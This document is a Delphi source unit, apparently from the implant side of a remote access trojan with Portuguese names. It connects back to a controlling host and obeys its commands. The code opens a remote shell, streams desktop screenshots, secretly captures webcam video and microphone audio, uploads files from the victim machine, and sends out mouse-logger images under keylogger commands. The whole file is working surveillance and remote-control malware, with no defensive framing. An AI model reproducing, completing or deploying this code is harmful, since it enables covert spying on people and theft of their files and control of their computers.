unit UnitNewConnection;

interface

uses
  IdIOHandler,
  Classes,
  GlobalVars;

Type
  TNewStream = Class(TMemoryStream);

procedure NewConnection(Host: ansistring;
                        Port: integer;
                        NewConnectionCommand: widestring;
                        Finalizar: boolean;
                        Extras: WideString = '');
procedure NewDownload(Host: ansistring; Port: integer; FileName: widestring; IsDownloadFolder: boolean = False);
procedure NewResumeDownload(Host: ansistring; Port: integer; FileName: widestring; FilePosition: int64);
procedure EnviarImagensMouse(Host: ansistring; Port: integer);

implementation

uses
  Windows,
  StrUtils,
  UnitConfigs,
  UnitConstantes,
  UnitFuncoesDiversas,
  SysUtils,
  ShellApi,
  UnitConexao,
  IdContext,
  IdTCPConnection,
  idGlobal,
  IdException,
  IdComponent,
  UnitShell,
  IdStream,
  untCapFuncs,
  ACMIn,
  mmsystem,
  uCamHelper,
  vcl.Graphics,
  UnitObjeto,
  ACMConvertor,
  GDIPAPI,
  GDIPOBJ,
  GDIPUTIL,
  ClassesMOD,
  ActiveX,
  WebcamAPI,
  UnitMouseLogger,
  UnitCompressString;

type
  TClientSocket = class(TObject)
    IdTCPClient1: TIdTCPClientNew;
    Command: widestring;
    Extras: WideString;
    FinalizarConexao: boolean;
    FecharAudio: boolean;
    FecharCam: boolean;
    procedure ExecutarComando(Recebido: widestring);
    procedure OnConnected(Sender: TObject);
  end;

type
  TWebcamThread = class(TThread)
  private
    IdTCPClient1: TIdTCPClientNew;
  protected
    procedure Execute; override;
  public
    constructor Create(xIdTCPClient1: TIdTCPClientNew);
  end;

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function GetImageFromBMP(RealBM: TBitmap; Quality: integer): widestring;
type
  TNewMemoryStream = TMemoryStream;
var
  ImageBMP: TGPBitmap;
  Pallete: HPALETTE;
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;
  transformation: TEncoderValue;
  xIs: IStream;
  BMPStream: TNewMemoryStream;
begin
  ImageBMP := TGPBitmap.Create(RealBM.Handle, Pallete);

  GetEncoderClsid('image/jpeg', encoderClsid);

  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  BMPStream := TNewMemoryStream.Create;
  xIS := TStreamAdapter.Create(BMPStream, soReference);
  ImageBMP.Save(xIS, encoderClsid, @encoderParameters);
  ImageBMP.Free;
  BMPStream.Position := 0;
  result := streamtostr(BMPStream);
  BMPStream.Free;
end;

procedure IniciarWebCam(xIdTCPClient1: TIdTCPClientNew);
var
  BMP: TBitmap;
  TempStr: widestring;
begin
  Sleep(1000);

  while CamHelper.Started do
  begin
    try
      if xIdTCPClient1.Connected = false then break else
      begin
        TempStr := '';

        BMP := TBitmap.Create;
        CamHelper.GetImage(BMP);
        TempStr := GetImageFromBMP(BMP, WebcamQuality);
        //BMP.SaveToFile('Webcam.bmp');
        BMP.Free;

        if TempStr <> '' then
        try
          xIdTCPClient1.EnviarString(WEBCAM + '|' + WEBCAMSTREAM + '|' + TempStr);
          except
          break;
        end;
        ProcessMessages;
        sleep(10);
        if WebcamInterval > 0 then sleep(WebcamInterval * 1000);
      end;
      except
      break;
    end;
  end;

  CamHelper.StopCam;

  if xIdTCPClient1.Connected then
  xIdTCPClient1.EnviarString(WEBCAM + '|' + WEBCAMSTOP + '|');
end;

type
  TEnviarImagens = class(TThread)
  private
    IdTCPClient1: TIdTCPClientNew;
  protected
    procedure Execute; override;
  public
    constructor Create(xIdTCPClient1: TIdTCPClientNew);
  end;

constructor TEnviarImagens.Create(xIdTCPClient1: TIdTCPClientNew);
begin
  IdTCPClient1 := xIdTCPClient1;
  inherited Create(True);
end;

procedure TEnviarImagens.Execute;
var
  ReplyStream: Tmemorystream;
  BMP: TBitmap;
  TempStr: WideString;
begin
  ReplyStream := Tmemorystream.Create;
  while (IdTCPClient1.Connected = true) do
  begin
    if GetWebcamImage(ReplyStream) = True then
    begin
      ReplyStream.Position := 0;
      BMP := TBitmap.Create;
      BMP.LoadFromStream(ReplyStream);
      TempStr := GetImageFromBMP(BMP, WebcamQuality);
      //BMP.SaveToFile('Webcam.bmp');
      BMP.Free;

      if TempStr <> '' then
      IdTCPClient1.EnviarString(WEBCAM + '|' + WEBCAMSTREAM + '|' + TempStr);

      ProcessMessages;
      sleep(10);
      if WebcamInterval > 0 then sleep(WebcamInterval * 1000);
    end;
  end;
  ReplyStream.Free;
  DestroyCapture;
end;

procedure IniciarWebCam2(xIdTCPClient1: TIdTCPClientNew);
var
  EnviarImagens: TEnviarImagens;
  Msg: TMsg;
begin
  if InitCapture(SelectedWebcam) = true then
  begin
    EnviarImagens := TEnviarImagens.Create(xIdTCPClient1);
    EnviarImagens.Resume;
    
    while Assigned(MyWebcamObject) and
         (GetMessage(Msg, MyWebcamObject.Handle, 0, 0)) do
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;

  if xIdTCPClient1.Connected then
  xIdTCPClient1.EnviarString(WEBCAM + '|' + WEBCAMSTOP + '|');
end;

constructor TWebcamThread.Create(xIdTCPClient1: TIdTCPClientNew);
begin
  IdTCPClient1 := xIdTCPClient1;
  inherited Create(True);
end;

procedure TWebcamThread.Execute;
begin
  if WebcamType = 0 then IniciarWebCam(IdTCPClient1) else IniciarWebCam2(IdTCPClient1);
end;

type
  TAudioThread = class(TThread)
  private
    IdTCPClient1: TIdTCPClientNew;
    Settings: widestring;
  protected
    procedure Execute; override;
  public
    constructor Create(xIdTCPClient1: TIdTCPClientNew; xSettings: widestring);
  end;

type
  TMain = class
    IdTCPClient1: TIdTCPClientNew;
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
  end;

threadvar
  ACMC: TACMConvertor;
  ACMI: TACMIn;
  Main: TMain;

procedure TMain.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  NewSize: Integer;
  AudioBuffer: widestring;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  NewSize := ACMC.Convert;
  SetLength(AudioBuffer, NewSize div 2);
  Move(ACMC.BufferOut^, AudioBuffer[1], NewSize);

  IdTCPClient1.EnviarString(AUDIO + '|' + AUDIOSTREAM + '|' + AudioBuffer);
end;

procedure IniciarAudio(IdTCPClient1: TIdTCPClientNew; xSettings: widestring);
var
  Recebido: widestring;
  Main: TMain;
  Format: TWaveFormatEx;
begin
  Recebido := xSettings;
  Move(Recebido[1], Format, SizeOf(TWaveFormatEx));

  Main := TMain.Create;
  Main.IdTCPClient1 := IdTCPClient1;
  ACMC := TACMConvertor.Create;
  ACMI := TACMIn.Create;
  ACMI.OnBufferFull := Main.BufferFull;
  ACMI.BufferSize := ACMC.InputBufferSize;
  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
  ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;
  ACMI.BufferSize := ACMC.InputBufferSize;
  ACMC.Active := True;
  ACMI.Open(ACMC.FormatIn);

  //MessageBox(0, pchar(Inttostr(Format.wFormatTag) + #13#10 +
  //                    Inttostr(Format.nChannels) + #13#10 +
  //                    Inttostr(Format.nSamplesPerSec) + #13#10 +
  //                    Inttostr(Format.nAvgBytesPerSec) + #13#10 +
  //                    Inttostr(Format.nBlockAlign) + #13#10 +
  //                    Inttostr(Format.wBitsPerSample) + #13#10 +
  //                    Inttostr(Format.cbSize)), '', 0);

  while (IdTCPClient1.Connected) and (GlobalVars.MainIdTCPClient <> nil) and (GlobalVars.MainIdTCPClient.Connected) do ProcessMessages;
  if IdTCPClient1.Connected then try IdTCPClient1.DisConnect; except end;
  if (GlobalVars.MainIdTCPClient <> nil) and (GlobalVars.MainIdTCPClient.Connected) then try IdTCPClient1.DisConnect; except end;
end;

constructor TAudioThread.Create(xIdTCPClient1: TIdTCPClientNew; xSettings: widestring);
begin
  IdTCPClient1 := xIdTCPClient1;
  Settings := xSettings;
  inherited Create(True);
end;

procedure TAudioThread.Execute;
begin
  IniciarAudio(IdTCPClient1, Settings);
end;

procedure TClientSocket.ExecutarComando(Recebido: WideString);
var
  FileName: widestring;
  FileSize: int64;
  Resultado: boolean;
  AStream: TFileStream;
  NewShell: TNewShell;
  TempStr: widestring;
  WebcamThread: TWebcamThread;
  AudioThread: TAudioThread;
  MyPoint : TPoint;
begin
  if copy(Recebido, 1, posex('|', Recebido) - 1) = SHELLSTART then
  begin
    ComandoShell := '';
    NewShell := TNewShell.Create(IdTCPClient1);
    NewShell.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SHELLCOMMAND then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    ComandoShell := Recebido;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SHELLDESATIVAR then
  begin
    ComandoShell := 'exit' + #13#10;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = STARTDESKTOP then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    DesktopQuality := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopX := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopY := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopInterval := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    while IdTCPClient1.Connected = true do
    begin
      if DesktopInterval <> 0 then sleep(DesktopInterval * 1000);
      TempStr := GetDesktopImage(DesktopQuality, DesktopX, DesktopY);
      IdTCPClient1.EnviarString(DESKTOPNEW + '|' + DESKTOPSTREAM + '|' + TempStr);
      sleep(10);
      processmessages;
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAMSTART then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    WebcamQuality := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    delete(Recebido, 1, posex('|', Recebido));
    WebcamInterval := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    WebcamThread := TWebcamThread.Create(IdTCPClient1);
    WebcamThread.Resume;

    if IdTCPClient1.Connected then sleep(100);
    FecharCam := True;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = AUDIOSETTINGS then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    AudioThread := TAudioThread.Create(IdTCPClient1, Recebido);
    AudioThread.Resume;

    while IdTCPClient1.Connected do sleep(100);
    FecharAudio := True;
  end else

end;

procedure TClientSocket.OnConnected(Sender: TObject);
begin
  IdTCPClient1.IOHandler.WriteLn(MYVERSION + '|' + ConfiguracoesServidor.Versao);
  if Command <> '' then IdTCPClient1.EnviarString(Command);
  if Extras <> '' then IdTCPClient1.EnviarString(Extras);
  if FinalizarConexao = True then
  begin
    sleep(10000);
    try
      IdTCPClient1.Disconnect;
      except
    end;  
  end;
end;

procedure NewConnection(Host: ansistring;
                        Port: integer;
                        NewConnectionCommand: widestring;
                        Finalizar: boolean;
                        Extras: WideString = '');
var
  ClientSocket: TClientSocket;
  TempStr: WideString;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Command := NewConnectionCommand;
  ClientSocket.Extras := Extras;
  ClientSocket.FinalizarConexao := Finalizar;
  ClientSocket.FecharAudio := False;
  ClientSocket.FecharCam := False;
  ClientSocket.IdTCPClient1 := TIdTCPClientNew.Create(nil, ConfiguracoesServidor.Password);
  ClientSocket.IdTCPClient1.OnConnected := ClientSocket.OnConnected;

  try
    ClientSocket.IdTCPClient1.Host := Host;
    ClientSocket.IdTCPClient1.Port := Port;
    try
      try
        ClientSocket.IdTCPClient1.Connect;
        while ClientSocket.IdTCPClient1.Connected do
        begin
          TempStr := ClientSocket.IdTCPClient1.ReceberString;
          if TempStr <> '' then ClientSocket.ExecutarComando(TempStr);
          sleep(100);
          ProcessMessages;
        end;
        finally
        sleep(10000);
        try
          ClientSocket.IdTCPClient1.Disconnect;
          except
        end;
      end;
      except // Failed during transfer
    end;
    except // Couldn't even connect
  end;

  ClientSocket.IdTCPClient1.OnConnected := nil;

  sleep(200);

  if ClientSocket.FecharAudio = True then
  begin
    ACMC.Active := False;
    ACMI.Close;
    ACMI.Free;
    ACMC.Free;
    Main.Free;
    Main := nil;
  end;


  if ClientSocket.FecharCam = True then
  begin
    if CamHelper <> nil then if CamHelper.Started = True then CamHelper.StopCam;
  end;

  FreeAndNil(ClientSocket.IdTCPClient1);
  FreeAndNil(ClientSocket);

end;

type
  TDownloadSocket = class(TObject)
    IdTCPClient1: TIdTCPClientNew;
    FileName: widestring;
    FinalizarConexao: boolean;
    IsDownloadFolder: boolean;
    procedure OnConnected(Sender: TObject);
  end;

procedure TDownloadSocket.OnConnected(Sender: TObject);
var
  AStream: TFileStream;
  FileSize: int64;
  ToSend: widestring;
begin
  IdTCPClient1.IOHandler.WriteLn(MYVERSION + '|' + ConfiguracoesServidor.Versao);
  IdTCPClient1.IOHandler.LargeStream := True;
  try
    AStream := TFileStream.Create(FileName, fmOpenRead + fmShareDenyNone);
    FileSize := AStream.Size;

    if IsDownloadFolder then
    ToSend := unitconstantes.NEWCONNECTION + '|' +
              ConnectionID +
              DelimitadorComandos +
              FILEMANAGERNEW + '|' +
              FMDOWNLOADFOLDER + '|' +
              FileName + DelimitadorComandos +
              IntToStr(FileSize) else
    ToSend := unitconstantes.NEWCONNECTION + '|' +
              ConnectionID +
              DelimitadorComandos +
              FILEMANAGERNEW + '|' +
              FMDOWNLOAD + '|' +
              FileName + DelimitadorComandos +
              IntToStr(FileSize);

    AStream.Position := 0;
    IdTCPClient1.EnviarString(ToSend);
    IdTCPClient1.IOHandler.Write(AStream,
                                          FileSize,
                                          False);
    finally
    FreeAndNil(AStream);
    sleep(10000);
    FinalizarConexao := true;
  end;
  FinalizarConexao := true;
end;

procedure NewDownload(Host: ansistring; Port: integer; FileName: widestring; IsDownloadFolder: boolean = False);
var
  ClientSocket: TDownloadSocket;
  TempStr: WideString;
begin
  ClientSocket := TDownloadSocket.Create;
  ClientSocket.FileName:= FileName;
  ClientSocket.FinalizarConexao := false;
  ClientSocket.IsDownloadFolder := IsDownloadFolder;
  ClientSocket.IdTCPClient1 := TIdTCPClientNew.Create(nil, ConfiguracoesServidor.Password);
  ClientSocket.IdTCPClient1.OnConnected := ClientSocket.OnConnected;

  try
    ClientSocket.IdTCPClient1.Host := Host;
    ClientSocket.IdTCPClient1.Port := Port;
    try
      try
        ClientSocket.IdTCPClient1.Connect;
        while (ClientSocket.IdTCPClient1.Connected) and (ClientSocket.FinalizarConexao = false) do
        begin
          TempStr := ClientSocket.IdTCPClient1.ReceberString;
          //if TempStr <> '' then ClientSocket.ExecutarComando(TempStr); //somente enviar, então não executa comando recebido...
          sleep(10);
        end;
        finally
        ClientSocket.IdTCPClient1.Disconnect;
      end;
      except // Failed during transfer
    end;
    except // Couldn't even connect
  end;

  ClientSocket.IdTCPClient1.OnConnected := nil;

  FreeAndNil(ClientSocket.IdTCPClient1);
  FreeAndNil(ClientSocket);
end;

type
  TResumeDownloadSocket = class(TObject)
    IdTCPClient1: TIdTCPClientNew;
    FileName: widestring;
    FilePosition: int64;
    FinalizarConexao: boolean;
    procedure OnConnected(Sender: TObject);
  end;

procedure TResumeDownloadSocket.OnConnected(Sender: TObject);
var
  AStream: TFileStream;
  FileSize: int64;
  ToSend: widestring;
begin
  IdTCPClient1.IOHandler.WriteLn(MYVERSION + '|' + ConfiguracoesServidor.Versao);
  IdTCPClient1.IOHandler.LargeStream := True;
  try
    AStream := TFileStream.Create(FileName, fmOpenRead + fmShareDenyNone);
    FileSize := AStream.Size;
    ToSend := unitconstantes.NEWCONNECTION + '|' +
              ConnectionID +
              DelimitadorComandos +
              FILEMANAGERNEW + '|' +
              FMRESUMEDOWNLOAD + '|' +
              FileName + DelimitadorComandos +
              IntToStr(FileSize) + '|' + IntToStr(FilePosition);

    AStream.Seek(FilePosition, 0);
    IdTCPClient1.EnviarString(ToSend);
    IdTCPClient1.IOHandler.Write(AStream,
                                          FileSize - FilePosition,
                                          False);
    finally
    FreeAndNil(AStream);
    sleep(10000);
    FinalizarConexao := true;
  end;
  FinalizarConexao := true;
end;

procedure NewResumeDownload(Host: ansistring; Port: integer; FileName: widestring; FilePosition: int64);
var
  ClientSocket: TResumeDownloadSocket;
  TempStr: WideString;
begin
  ClientSocket := TResumeDownloadSocket.Create;
  ClientSocket.FileName:= FileName;
  ClientSocket.FinalizarConexao := false;
  ClientSocket.FilePosition := FilePosition;
  ClientSocket.IdTCPClient1 := TIdTCPClientNew.Create(nil, ConfiguracoesServidor.Password);
  ClientSocket.IdTCPClient1.OnConnected := ClientSocket.OnConnected;

  try
    ClientSocket.IdTCPClient1.Host := Host;
    ClientSocket.IdTCPClient1.Port := Port;
    try
      try
        ClientSocket.IdTCPClient1.Connect;
        while (ClientSocket.IdTCPClient1.Connected) and (ClientSocket.FinalizarConexao = false) do
        begin
          TempStr := ClientSocket.IdTCPClient1.ReceberString;
          //if TempStr <> '' then ClientSocket.ExecutarComando(TempStr); //somente enviar, então não executa comando recebido...
          sleep(10);
        end;
        finally
        ClientSocket.IdTCPClient1.Disconnect;
      end;
      except // Failed during transfer
    end;
    except // Couldn't even connect
  end;

  ClientSocket.IdTCPClient1.OnConnected := nil;

  FreeAndNil(ClientSocket.IdTCPClient1);
  FreeAndNil(ClientSocket);
end;

function ListarArquivos(Dir, Extensao: WideString; var Qtde: integer): WideString;
var
  H: THandle;
  Find: TWin32FindDataW;
  TempStr: WideString;
begin
  result := '';
  Qtde := 0;
  if dir = '' then exit;
  if dir[length(dir)] <> '\' then Dir := Dir + '\';

  TempStr := Dir + Extensao; // *.ini
  H := FindFirstFileW(pwidechar(TempStr), Find);
  if H = INVALID_HANDLE_VALUE then exit;

  if not (Find.dwFileAttributes and $00000010 <> 0) then  // não é diretório
  if (WideString(Find.cFileName) <> '.') and (WideString(Find.cFileName) <> '..') then
  begin
    Qtde := Qtde + 1;
    Result := Result + Dir + WideString(Find.cFileName) +  #13#10;
  end;

  while FindNextFileW(H, Find) do
  if not (Find.dwFileAttributes and $00000010 <> 0) then  // não é diretório
  if (WideString(Find.cFileName) <> '.') and (WideString(Find.cFileName) <> '..') then
  begin
    Qtde := Qtde + 1;
    Result := Result + Dir + WideString(Find.cFileName) +  #13#10;
  end;
  Windows.FindClose(H);
end;

type
  TEnviarMouseImagens = class(TObject)
    IdTCPClient1: TIdTCPClientNew;
    FinalizarConexao: boolean;
    procedure OnConnected(Sender: TObject);
  end;

procedure TEnviarMouseImagens.OnConnected(Sender: TObject);
var
  FileSize: int64;
  ToSend: widestring;
  TempStr, TempFile, s: WideString;
  TempInt: integer;
  p: pointer;
begin
  IdTCPClient1.IOHandler.WriteLn(MYVERSION + '|' + ConfiguracoesServidor.Versao);
  IdTCPClient1.IOHandler.LargeStream := True;
  try
    TempStr := ListarArquivos(MouseFolder, '*.jpg', TempInt);

    ToSend := unitconstantes.NEWCONNECTION + '|' +
              ConnectionID +
              DelimitadorComandos +
              KEYLOGGERNEW + '|' +
              MOUSELOGGERSTARTSEND + '|' +
              IntToStr(TempInt);

    IdTCPClient1.EnviarString(ToSend);

    if Tempint > 0 then
    begin
      while (posex(#13#10, TempStr) > 0) and (IdTCPClient1.Connected = true) do
      begin
        TempFile := Copy(TempStr, 1, posex(#13#10, TempStr) - 1);
        Delete(TempStr, 1, posex(#13#10, TempStr) + 1);

        FileSize := LerArquivo(pWideChar(TempFile), p);
        if FileSize > 0 then
        begin
          SetLength(s, FileSize div 2);
          CopyMemory(@s[1], p, FileSize);
          s := KEYLOGGER + '|' + MOUSELOGGERBUFFER + '|' + TempFile + DelimitadorComandos + s;
          IdTCPClient1.EnviarString(s);
          sleep(50);
          ProcessMessages;
        end;
      end;
    end;
    finally
    sleep(10000);
    FinalizarConexao := true;
  end;
  FinalizarConexao := true;
end;

procedure EnviarImagensMouse(Host: ansistring; Port: integer);
var
  ClientSocket: TEnviarMouseImagens;
  TempStr: WideString;
begin
  ClientSocket := TEnviarMouseImagens.Create;
  ClientSocket.FinalizarConexao := false;
  ClientSocket.IdTCPClient1 := TIdTCPClientNew.Create(nil, ConfiguracoesServidor.Password);
  ClientSocket.IdTCPClient1.OnConnected := ClientSocket.OnConnected;

  try
    ClientSocket.IdTCPClient1.Host := Host;
    ClientSocket.IdTCPClient1.Port := Port;
    try
      try
        ClientSocket.IdTCPClient1.Connect;
        while (ClientSocket.IdTCPClient1.Connected) and (ClientSocket.FinalizarConexao = false) do
        begin
          TempStr := ClientSocket.IdTCPClient1.ReceberString;
          //if TempStr <> '' then ClientSocket.ExecutarComando(TempStr); //somente enviar, então não executa comando recebido...
          sleep(10);
        end;
        finally
        ClientSocket.IdTCPClient1.Disconnect;
      end;
      except // Failed during transfer
    end;
    except // Couldn't even connect
  end;

  ClientSocket.IdTCPClient1.OnConnected := nil;

  FreeAndNil(ClientSocket.IdTCPClient1);
  FreeAndNil(ClientSocket);
end;

end.
